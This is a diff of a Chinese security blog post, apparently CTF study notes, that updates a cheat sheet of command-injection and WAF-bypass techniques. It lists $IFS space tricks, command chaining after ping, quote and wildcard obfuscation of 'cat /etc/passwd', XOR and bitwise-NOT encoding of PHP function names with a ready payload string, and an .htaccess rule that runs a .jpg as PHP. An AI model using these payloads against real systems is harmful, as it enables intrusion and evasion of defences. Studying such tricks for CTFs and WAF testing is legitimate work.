@@ -19,15 +19,15 @@
   <meta name="author" content="fogpost">
   <meta name="keywords" content="">
   
-    <meta name="description" content="rce绕过总结空格绕过：在bash下可以用$IFS、${IFS}、$IFS$9、%09、&lt;、&gt;、&lt;&gt;、{,}（例如{cat,&#x2F;etc&#x2F;passwd} ）、%20(space)、%09(tab) 命令执行函数system()绕过系统命令函数system() passthru() exec() shell_exec() popen() proc_open()">
+    <meta name="description" content="waf绕过总结ping在ping的过程中一些地方可以在后方利用;或者|直接进行命令执行，但这时便会遇到一些相关方面的waf也就是阻拦，我们需要绕过这些waf 空格绕过：在bash下可以用$IFS、${IFS}、$IFS$9、%09、&lt;、&gt;、&lt;&gt;、{,}（例如{cat,&#x2F;etc&#x2F;passwd} ）、%20(space)、%09(tab) 命令执行函数sys">
 <meta property="og:type" content="article">
-<meta property="og:title" content="rce绕过总结">
+<meta property="og:title" content="waf绕过总结">
 <meta property="og:url" content="https://fogpost.top/2024/12/11/rce%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/index.html">
 <meta property="og:site_name" content="fogpost&#96;s little blog">
-<meta property="og:description" content="rce绕过总结空格绕过：在bash下可以用$IFS、${IFS}、$IFS$9、%09、&lt;、&gt;、&lt;&gt;、{,}（例如{cat,&#x2F;etc&#x2F;passwd} ）、%20(space)、%09(tab) 命令执行函数system()绕过系统命令函数system() passthru() exec() shell_exec() popen() proc_open()">
+<meta property="og:description" content="waf绕过总结ping在ping的过程中一些地方可以在后方利用;或者|直接进行命令执行，但这时便会遇到一些相关方面的waf也就是阻拦，我们需要绕过这些waf 空格绕过：在bash下可以用$IFS、${IFS}、$IFS$9、%09、&lt;、&gt;、&lt;&gt;、{,}（例如{cat,&#x2F;etc&#x2F;passwd} ）、%20(space)、%09(tab) 命令执行函数sys">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2024-12-11T07:39:59.000Z">
-<meta property="article:modified_time" content="2024-12-11T08:24:42.113Z">
+<meta property="article:modified_time" content="2025-01-11T02:46:15.332Z">
 <meta property="article:author" content="fogpost">
 <meta property="article:tag" content="web">
 <meta name="twitter:card" content="summary_large_image">
@@ -37,7 +37,7 @@
     <!-- <meta name="referrer" content="no-referrer" /> -->
   
   
-  <title>rce绕过总结 - fogpost`s little blog</title>
+  <title>waf绕过总结 - fogpost`s little blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -215,7 +215,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="rce绕过总结"></span>
+            <span id="subtitle" data-typed-text="waf绕过总结"></span>
           
         </div>
 
@@ -238,7 +238,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          728 字
+          988 字
         
       </span>
     
@@ -249,7 +249,7 @@
         
         
         
-          7 分钟
+          9 分钟
         
       </span>
     
@@ -295,12 +295,12 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">rce绕过总结</h1>
+            <h1 id="seo-header">waf绕过总结</h1>
             
               <p id="updated-time" class="note note-info" style="display: none">
                 
                   
-                    本文最后更新于 2024-12-11T16:24:42+08:00
+                    本文最后更新于 2025-01-11T10:46:15+08:00
                   
                   
 
@@ -310,7 +310,8 @@
             
               <div class="markdown-body">
                 
-                <h1 id="rce绕过总结"><a href="#rce绕过总结" class="headerlink" title="rce绕过总结"></a>rce绕过总结</h1><h2 id="空格绕过："><a href="#空格绕过：" class="headerlink" title="空格绕过："></a>空格绕过：</h2><p>在bash下可以用$IFS、${IFS}、$IFS$9、%09、&lt;、&gt;、&lt;&gt;、{,}（例如{cat,&#x2F;etc&#x2F;passwd} ）、%20(space)、%09(tab)</p>
+                <h1 id="waf绕过总结"><a href="#waf绕过总结" class="headerlink" title="waf绕过总结"></a>waf绕过总结</h1><h2 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h2><p>在ping的过程中一些地方可以在后方利用;或者|直接进行命令执行，但这时便会遇到一些相关方面的waf也就是阻拦，我们需要绕过这些waf</p>
+<h2 id="空格绕过："><a href="#空格绕过：" class="headerlink" title="空格绕过："></a>空格绕过：</h2><p>在bash下可以用$IFS、${IFS}、$IFS$9、%09、&lt;、&gt;、&lt;&gt;、{,}（例如{cat,&#x2F;etc&#x2F;passwd} ）、%20(space)、%09(tab)</p>
 <h2 id="命令执行函数system-绕过"><a href="#命令执行函数system-绕过" class="headerlink" title="命令执行函数system()绕过"></a>命令执行函数system()绕过</h2><p>系统命令函数system() passthru() exec() shell_exec() popen() proc_open() pcntl_exec() 反引号（·） 同shell_exec()用以上函数都可进行绕过。</p>
 <h2 id="命令链接符："><a href="#命令链接符：" class="headerlink" title="命令链接符："></a>命令链接符：</h2><p>Windows和Linux都支持的命令连接符：<br>cmd1 | cmd2 只执行cmd2<br>cmd1 || cmd2 只有当cmd1执行失败后，cmd2才被执行<br>cmd1 &amp; cmd2 先执行cmd1，不管是否成功，都会执行cmd2<br>cmd1 &amp;&amp; cmd2 先执行cmd1，cmd1执行成功后才执行cmd2，否则不执行cmd2<br>Linux还支持分号（;），cmd1;cmd2 按顺序依次执行，先执行cmd1再执行cmd2  </p>
 <h2 id="正则匹配绕过"><a href="#正则匹配绕过" class="headerlink" title="正则匹配绕过"></a>正则匹配绕过</h2><h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><p>普通的正则只会匹配一次，所以我们可以双写绕过。pphphp，只会过滤掉中间的php剩下来的部分可以组成第二个php，phpphpinfoinfo，同理。</p>
@@ -320,18 +321,20 @@
 <h3 id="利用oct编码（八进制）绕过"><a href="#利用oct编码（八进制）绕过" class="headerlink" title="利用oct编码（八进制）绕过"></a>利用oct编码（八进制）绕过</h3><p>$(printf “\154\163”)  &#x2F;&#x2F;ls命令</p>
 <h3 id="利用16进制编码绕过"><a href="#利用16进制编码绕过" class="headerlink" title="利用16进制编码绕过"></a>利用16进制编码绕过</h3><p>“\x73\x79\x73\x74\x65\x6d”(“cat &#x2F;etc&#x2F;passwd”)</p>
 <h3 id="利用拼接绕过"><a href="#利用拼接绕过" class="headerlink" title="利用拼接绕过"></a>利用拼接绕过</h3><p>(sy.(st).em)(whoami);&#x2F;&#x2F;<br>c’’a’’t &#x2F;etc&#x2F;passwd&#x2F;&#x2F;单引<br>c””a””t &#x2F;etc&#x2F;passwd&#x2F;&#x2F;双引<br>c<code>a</code>t &#x2F;etc&#x2F;passwd&#x2F;反单引<br>c\a\t &#x2F;etc&#x2F;passwd&#x2F;&#x2F;反斜线<br>$*和$@，$x(x 代表 1-9),${x}(x&gt;&#x3D;10) :<br>比如ca${21}t a.txt表示cat a.txt 在没有传入参数的情况下,这些特殊字符默认为空,如下:<br>wh$1oami<br>who$@ami<br>whoa$*mi<br>666<code>whoami</code>666 &#x2F;&#x2F;bash: 666root666: command not found<br>666<code>\whoami</code>666 &#x2F;&#x2F;bash: 666root666: command not found<br>&#x2F;&#x2F;命令执行后的结果在2个666中间  </p>
-<h3 id="插入注释"><a href="#插入注释" class="headerlink" title="插入注释"></a>插入注释</h3><p>（这对于绕过阻止特定PHP函数名称的WAF规则集很有用）</p>
-<p>system&#x2F;<em>A10ng_</em>&#x2F;(whoami);<br>system&#x2F;<em>A10ng_</em>&#x2F;(wh.&#x2F;<em>A10ng_</em>&#x2F;(oa)&#x2F;<em>caixukun</em>&#x2F;.mi);<br>(sy.&#x2F;<em>A10ng_</em>&#x2F;(st)&#x2F;<em>A10ng_</em>&#x2F;.em)&#x2F;<em>A10ng_</em>&#x2F;(wh.&#x2F;<em>A10ng_</em>&#x2F;(oa)&#x2F;<em>A10ng_</em>&#x2F;.mi);</p>
+<h3 id="插入注释"><a href="#插入注释" class="headerlink" title="插入注释"></a>插入注释</h3><p>（这对于绕过阻止特定PHP函数名称的WAF规则集很有用）<br>system&#x2F;<em>A10ng_</em>&#x2F;(whoami);<br>system&#x2F;<em>A10ng_</em>&#x2F;(wh.&#x2F;<em>A10ng_</em>&#x2F;(oa)&#x2F;<em>caixukun</em>&#x2F;.mi);<br>(sy.&#x2F;<em>A10ng_</em>&#x2F;(st)&#x2F;<em>A10ng_</em>&#x2F;.em)&#x2F;<em>A10ng_</em>&#x2F;(wh.&#x2F;<em>A10ng_</em>&#x2F;(oa)&#x2F;<em>A10ng_</em>&#x2F;.mi);</p>
 <h3 id="利用未初始化变量"><a href="#利用未初始化变量" class="headerlink" title="利用未初始化变量"></a>利用未初始化变量</h3><p>cat$u &#x2F;etc&#x2F;passwd<br>cat &#x2F;etc$u&#x2F;passwd</p>
 <h3 id="过滤了斜杠’-‘"><a href="#过滤了斜杠’-‘" class="headerlink" title="过滤了斜杠’&#x2F;‘"></a>过滤了斜杠’&#x2F;‘</h3><p>可利用’;’拼接命令绕过<br>cd ..;cd ..;cd ..;cd ..;cd etc;cat passwd</p>
 <h3 id="利用通配符绕过"><a href="#利用通配符绕过" class="headerlink" title="利用通配符绕过"></a>利用通配符绕过</h3><p>cat &#x2F;passwd：<br>??? &#x2F;e??&#x2F;?a????</p>
-<h3 id="利用path绕过"><a href="#利用path绕过" class="headerlink" title="利用path绕过"></a>利用path绕过</h3><p>可以通过截断和拼接来得到我们想要的来getshell<br>${PATH:5:1} &#x2F;&#x2F;l<br>${PATH:2:1} &#x2F;&#x2F;s<br>${PATH:5:1}${PATH:2:1} &#x2F;&#x2F;拼接后是ls,执行命令<br>${PATH:5:1}s &#x2F;&#x2F;拼接后是ls,执行命令  </p>
+<h3 id="利用path绕过"><a href="#利用path绕过" class="headerlink" title="利用path绕过"></a>利用path绕过</h3><p>可以通过截断和拼接来得到我们想要的来getshell<br>${PATH:5:1} &#x2F;&#x2F;l<br>${PATH:2:1} &#x2F;&#x2F;s<br>${PATH:5:1}${PATH:2:1} &#x2F;&#x2F;拼接后是ls,执行命令<br>${PATH:5:1}s &#x2F;&#x2F;拼接后是ls,执行命令 </p>
 <h3 id="异或绕过"><a href="#异或绕过" class="headerlink" title="异或绕过"></a>异或绕过</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">def</span> <span class="hljs-title function_">xor</span>():<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">128</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">128</span>):<br>            result=i^j<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(i)+<span class="hljs-string">&#x27;  ^  &#x27;</span>+<span class="hljs-built_in">chr</span>(j)+<span class="hljs-string">&#x27; == &gt;  &#x27;</span>+<span class="hljs-built_in">chr</span>(result)+<span class="hljs-string">&quot; ASCII:&quot;</span>+<span class="hljs-built_in">str</span>(result))<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    xor()<br></code></pre></td></tr></table></figure>
 
 <p>(‘GGGGGGG’^’7&#x2F;7.)!(‘)();<br>其中’G’^’7’&#x3D;p，’G’^’&#x2F;‘&#x3D;h…………依次类推拼出你想得到的令。</p>
-<h3 id="取反绕过"><a href="#取反绕过" class="headerlink" title="取反绕过"></a>取反绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-string">&#x27;phpinfo&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<h3 id="取反绕过"><a href="#取反绕过" class="headerlink" title="取反绕过"></a>取反绕过</h3><p>在这里存在一个取反的问题，原因是隐藏字母、可还原性、URL 编码与二进制兼容性<br>取反是一种隐蔽技术，它将敏感字符转换为难以识别的形式，有效规避检测。而不取反会直接暴露敏感字符或使其更容易被解码检测。结合 urlencode() 等方法，按位取反可以提升绕过复杂度并增强隐匿性</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-string">&#x27;phpinfo&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 <p>例如phpinfo()就是：<br>(~’%8F%97%8F%96%91%99%90’)();</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;system&quot;</span>;<br><span class="hljs-variable">$b</span> = <span class="hljs-string">&quot;ls /&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$a</span>);  <span class="hljs-comment">// 使用 ~$a，按位取反操作</span><br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$b</span>);  <span class="hljs-comment">// 使用 ~$b，按位取反操作</span><br><span class="hljs-meta">?&gt;</span><br>payload=?wllm=(~%<span class="hljs-number">8</span>c%<span class="hljs-number">86</span>%<span class="hljs-number">8</span>c%<span class="hljs-number">8</span>b%<span class="hljs-number">9</span>a%<span class="hljs-number">92</span>)(~%<span class="hljs-number">9</span>C%<span class="hljs-number">9</span>E%<span class="hljs-number">8</span>B%DF%D0%<span class="hljs-number">99</span>%D5);<br></code></pre></td></tr></table></figure>
 
+<h2 id="htaccess文件包含绕过"><a href="#htaccess文件包含绕过" class="headerlink" title=".htaccess文件包含绕过"></a>.htaccess文件包含绕过</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//仅匹配1.jpg，也可以适用全部文件，解析为php</span><br>&lt;<span class="hljs-title class_">FilesMatch</span> <span class="hljs-string">&quot;1.jpg&quot;</span>&gt;<br><span class="hljs-title class_">SetHandler</span> application/x-httpd-php<br>&lt;/<span class="hljs-title class_">FilesMatch</span>&gt;<br></code></pre></td></tr></table></figure>
                 
               </div>
             
@@ -376,7 +379,7 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>rce绕过总结</div>
+      <div>waf绕过总结</div>
       <div>https://fogpost.top/2024/12/11/rce绕过总结/</div>
     </div>
     <div class="license-meta">
